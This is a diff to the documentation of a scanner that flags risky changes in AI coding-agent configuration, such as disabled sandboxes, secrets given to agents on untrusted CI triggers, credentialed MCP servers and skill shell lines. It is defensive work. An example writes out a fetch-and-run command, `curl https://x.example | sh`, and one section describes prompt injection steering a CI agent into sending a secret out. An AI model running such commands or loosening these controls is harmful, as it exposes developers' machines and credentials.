@@ -1022,6 +1022,10 @@ reads "Added: Hook on event 'SessionStart' for host 'Claude Code' runs
 Confidence is `high` when the command is recorded whole, `medium` when
 it was cut at the 512-character bound.
 
+A skill's shell lines and a plugin's `bin/` directory are reported by
+[component shell execution](#component-shell-execution), not here
+(this rule reported them before version 1.1.0).
+
 **Change states and confidence:** `added` or `changed` (command `high`, other hook types `medium`), `removed` (`info`), and `not-compared` on a scan with no baseline (`low`). A hook removed and re-added on another event with the same command is a move and is silent. Confidence is `high`, or `medium` when the command was cut at the recording bound.
 
 **Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.
@@ -1094,8 +1098,8 @@ to `"never"`. The finding reads "Codex: 'approval_policy' moved from
 | Gemini CLI `general.defaultApprovalMode` | `plan`, `default`, `auto_edit`, `yolo` |
 | A subagent's `permissionMode` | the Claude Code order, short of `bypassPermissions` (reported by [component self-grant](#component-self-grant)) |
 
-Also reported: Claude Code `disableAllHooks`, `disableSkillShellExecution`,
-or `sandbox.enabled` going from `true` to anything else, and
+Also reported: Claude Code `disableAllHooks` or `disableSkillShellExecution`
+going from `true` to anything else, and
 `disableBypassPermissionsMode` being removed; and a tool added to a Kiro
 `autoApprove`, Roo `alwaysAllow`, or Cline `autoApprove` list, or a
 Gemini CLI server given `trust: true`.
@@ -1105,6 +1109,10 @@ Gemini CLI server given `trust: true`.
 | Loosened | `high` |
 | No baseline (first scan): a host at the loose end of a scale, or an auto-approval | `low` |
 | Tightened or unchanged | none |
+
+Sandbox and network egress settings, including Claude Code's
+`sandbox.enabled` (read by this rule before version 1.1.0), are reported
+by [agent sandbox weakened](#agent-sandbox-weakened).
 
 **Change states and confidence:** `changed`, or `added` when a host first appears with a loose setting (`high`); `not-compared` on a scan with no baseline for a host in a bypass mode and for each auto-approval (`low`). Confidence is `high`.
 
@@ -1287,6 +1295,263 @@ committed secret is exposed whether or not the current change added it,
 so it is reported on every scan, at the severity and confidence above.
 Rotate the credential first; a suppression for it should name the
 finding's `id` and expire soon.
+
+<a id="agent-sandbox-weakened"></a>
+## Agent sandbox weakened
+
+**Outcome:** a change that turns off a coding agent's sandbox, lets its
+commands run outside the sandbox, approves every command because a
+sandbox exists, or opens its network egress is reported, the way a move
+to `bypassPermissions` already is.
+
+**Why this matters:** the sandbox is what keeps an agent's shell commands
+away from the rest of the machine and the network, and the [limits
+page](agent-authority-limits.md) recommends pairing a passing gate with
+sandboxed or network-restricted runs. A project file that loosens it
+does so for everyone who opens the repository.
+
+**Example:** `.claude/settings.json` changes `"sandbox": {"enabled":
+true}` to `false`. The finding reads "Claude Code: 'sandbox.enabled'
+moved from 'true' to 'false'." at `high`.
+
+| Setting | Order, tightest first |
+| --- | --- |
+| Claude Code `sandbox.enabled` | `true`, `false` |
+| Claude Code `sandbox.allowUnsandboxedCommands` | `false`, `true` |
+| Claude Code `sandbox.autoAllowBashIfSandboxed` | `false`, `true` |
+| Codex `sandbox_workspace_write.network_access` | `false`, `true` |
+| Gemini CLI `tools.sandbox` | on (`true` or a sandbox command such as `docker`), `false` |
+| Gemini CLI `tools.sandboxNetworkAccess` | `false`, `true` |
+| Cursor `egressMode` (`.cursor/environment.json`) | `network_settings_only`, `default_with_network_settings`, `parent_plus_network_settings`, `allow_all` |
+
+A move toward the loose end is a loosening. So is removing a setting
+that was tighter than the loose end, since the protection is gone, and
+setting one to the loose end where the project file had not set it. A
+value this rule does not know is not reported. Every loosened setting on
+one host is one finding.
+
+| Change state | Severity |
+| --- | --- |
+| Loosened | `high` |
+| No baseline (first scan): a setting already at the loose end | `low` |
+| Tightened or unchanged | none |
+
+Approval modes and Codex `sandbox_mode` stay with [permission bypass from
+project files](#permission-bypass-from-project); this rule takes the
+remaining sandbox and egress settings, including Claude Code's
+`sandbox.enabled`.
+
+**Change states and confidence:** `changed`, or `added` when a host first appears with a loose setting (`high`); `not-compared` on a scan with no baseline (`low`). Confidence is `high`.
+
+**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.
+
+**Remediation:** keep the tight value in the project file, and set looser
+values in personal settings outside the repository when one person needs
+them. The finding's remediation names the tight value for each setting
+the host has.
+
+**False positives:** a host version that ignores a setting from a project
+file is still reported, because other versions honor it. Cursor's
+`egressMode` order comes from its environment schema's descriptions;
+the documentation states none.
+
+<a id="secret-exposed-to-untrusted-agent-run"></a>
+## Secret exposed to an untrusted agent run
+
+**Outcome:** a workflow job that runs a coding agent on untrusted input
+and is given a repository secret is reported, naming the secrets and the
+trigger.
+
+**Why this matters:** this is the [exfiltration
+triangle](#exfiltration-triangle) for CI agents. Whoever opens the pull
+request or writes the comment can steer the agent (untrusted input), the
+job holds the secret (sensitive data), and the agent can reach the
+network. An injected instruction can read the secret and send it out.
+It is a separate rule because the triangle reads agent, resource, and
+tool nodes, and this reads one workflow job's recorded triggers and
+secret names.
+
+**Example:** a job on `pull_request_target` runs
+`anthropics/claude-code-action@v1` with `env: DEPLOY_KEY: ${{
+secrets.DEPLOY_KEY }}`. The finding reads "Job 'agent / review' runs an
+agent on untrusted input (pull_request_target) and is given secret
+DEPLOY_KEY." at `high`.
+
+Untrusted input is a job triggered by `pull_request_target`,
+`issue_comment`, `workflow_run`, `issues`,
+`pull_request_review_comment`, or `discussion_comment`, or one that
+checks out the pull request head. A secret is any `secrets.<NAME>` the
+job's `env` or the agent step references, except `GITHUB_TOKEN`, whose
+permissions are [over-privileged agent
+workflow](#overprivileged-agent-workflow)'s. The agent's own API key
+(`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`) counts: it can
+still be read and sent out.
+
+| Change state | Severity |
+| --- | --- |
+| Added, changed into this state, or given another secret | `high` |
+| No baseline (first scan) | `medium` |
+| Exposed secrets unchanged since the baseline, trigger or secrets removed | none |
+
+**Change states and confidence:** `added` or `changed` (`high`, naming only the secrets the change newly exposes); `not-compared` on a scan with no baseline (`medium`). Confidence is `high`. Secret names are reported; values are never read.
+
+**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.
+
+**Remediation:** run the agent on `pull_request` from the base branch,
+move the secret to a job the agent does not run in, or gate the job on an
+environment that needs approval. If the secret is the agent's own API
+key, scope it to this job and set a spend limit.
+
+**False positives:** a job whose runner blocks outbound network access
+is still reported; the rule does not read runner or firewall settings.
+So is a `pull_request_target` job limited to collaborators by a job
+condition, since the condition is not evaluated.
+
+<a id="credentialed-remote-mcp-server"></a>
+## Credentialed remote MCP server
+
+**Outcome:** a new or changed HTTP or SSE MCP server whose declaration
+sends a credential to a remote host is reported, naming the server, the
+host, and the header or variable name.
+
+**Why this matters:** a committed server declaration with an
+`Authorization` header or a token variable sends that credential to the
+server's host on every request the agent makes. A pull request that adds
+such a server, adds a credential to one, or points one at a new host
+decides where a credential goes. [MCP server identity
+change](#mcp-server-identity-change) sees the same-name swap; this rule
+says what the server carries.
+
+**Example:** `.mcp.json` adds a server `docs` with `"url":
+"https://api.example.com/mcp"` and an `Authorization` header. The finding
+reads "MCP server 'docs' sends Authorization to api.example.com." at
+`medium`. If a later change points `docs` at `collector.example.net`, the
+finding reads "MCP server 'docs' now sends Authorization to
+collector.example.net, previously api.example.com." at `high`.
+
+A credential is recognized by its header or variable **name**, never its
+value, which the adapter never reads. The names, compared
+case-insensitively, are `authorization`, `proxy-authorization`,
+`x-api-key`, `api-key`, and any name ending in `_token`, `_secret`,
+`_key`, `_password`, `_credential`, or `_apikey`. A server's
+`bearer_token_env_var` (Codex) joins its variable names.
+
+| Change state | Severity |
+| --- | --- |
+| Credentialed server's host changed | `high` |
+| Credentialed server added | `medium` |
+| Credential name added to an existing server | `medium` |
+| No baseline (first scan) | `low` |
+| Removed, unchanged, or no credential-shaped name | none |
+
+A stdio server never fires here, whatever its environment names: its
+environment goes to a local process. There is no allowlist of trusted
+hosts; approve a reviewed server instead.
+
+**Change states and confidence:** `added` (`medium`) or `changed` (`high` for a new host, `medium` for a new credential name); `not-compared` on a scan with no baseline (`low`). Confidence is `high`.
+
+**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too. A Team organization can also record an exception for the finding.
+
+**Remediation:** keep the credential in the agent host's own secret store
+rather than in the committed declaration's headers, pin the server, and
+confirm the host is first party or one you trust with the credential.
+
+**False positives:** a header or variable whose name matches the shape
+but carries no secret, such as a public `X-API-Key` for a free service,
+is still reported; the rule never reads values.
+
+<a id="workspace-scope-expansion"></a>
+## Workspace scope expansion
+
+**Outcome:** a change that adds the home directory, the filesystem root,
+or any other directory outside the repository to a coding agent's
+workspace is reported, naming the host.
+
+**Why this matters:** Claude Code's `permissions.additionalDirectories`
+gives the agent read and write access to each listed directory, as freely
+as the repository itself. A directory outside the repository hands the
+agent files the repository's review never covers: other projects, shell
+profiles, credentials.
+
+**Example:** `.claude/settings.json` adds `"additionalDirectories":
+["~/"]`. The finding reads "Claude Code can now read and write a
+directory outside the repository." at `high`. The path itself is never
+printed; the adapter records it only as `<outside-repository>`.
+
+An absolute or home-relative path is outside the repository, and so is a
+relative path that climbs out with `..`.
+
+| Change state | Severity |
+| --- | --- |
+| Outside directory added, or an entry changed to one | `high` |
+| Directory inside the repository added | `low` |
+| No baseline (first scan): an outside directory | `low` |
+| Removed, narrowed to inside, unchanged, or inside on a first scan | none |
+
+Codex's `sandbox_workspace_write.writable_roots` is not recorded by the
+Codex adapter yet, so this rule does not cover Codex.
+
+**Change states and confidence:** `added` or `changed` (`high` for an outside directory, `low` for an inside one); `not-compared` on a scan with no baseline (`low`). Confidence is `high`.
+
+**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.
+
+**Remediation:** remove the entry, or narrow it to a path inside the
+repository, and prefer the agent host's sandbox for anything it must
+reach outside it.
+
+**False positives:** a shared directory every developer has at the same
+absolute path, such as a mounted read-only dataset, is still reported,
+because the rule cannot see what the path holds. Approve it once
+reviewed.
+
+<a id="component-shell-execution"></a>
+## Component shell execution
+
+**Outcome:** a skill that gains a `` !`cmd` `` line or a ` ```! ` block,
+or a plugin that gains a `bin/` directory, is reported like a hook
+change, naming the skill or plugin, the file, and the command.
+
+**Why this matters:** a skill's shell line runs when the skill loads,
+before any prompt reaches the model and with no permission prompt. A
+plugin's `bin/` directory joins the agent's `PATH`, so whatever it holds
+runs as a bare command name. Both are code execution a repository ships
+to everyone who opens it.
+
+**Example:** a pull request adds `` !`curl https://x.example | sh` `` to
+`.claude/skills/deploy/SKILL.md`. The finding reads "Added: Skill deploy
+runs `curl https://x.example | sh` when it loads, before any prompt
+reaches the model." at `high`.
+
+| Change state | Severity |
+| --- | --- |
+| Skill shell command added or changed | `high` |
+| Plugin `bin/` directory added | `high` |
+| Removed | `info` |
+| No baseline (first scan): once per skill or plugin | `low` |
+| Unchanged | none |
+
+A skill's commands are compared as a set, so a line inserted above
+another reports only the new command. The command is the recorded text,
+redacted the way hook commands are.
+
+This is a separate rule from [agent hook command
+change](#agent-hook-command-change) so an organization can act on it
+separately, for example blocking hook changes while warning on skill
+lines. Before rule pack `0.8.0`, the hook rule reported these as
+"Setting 'skill-shell'" and "Setting 'plugin-bin'" findings.
+
+**Change states and confidence:** `added` or `changed` (`high`), `removed` (`info`), and `not-compared` on a scan with no baseline (`low`). Confidence is `high`, or `medium` when the command was cut at the recording bound.
+
+**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.
+
+**Remediation:** read the command and confirm every developer should run
+it when the skill loads or the plugin is enabled. Prefer moving it
+behind a permission rule, or drop the shell line and let the model call
+the tool when asked.
+
+**False positives:** every new shell line is reported, including a
+harmless `git status`. The rule reports the change; approve a reviewed
+one once.
 
 ## Known limitations
 
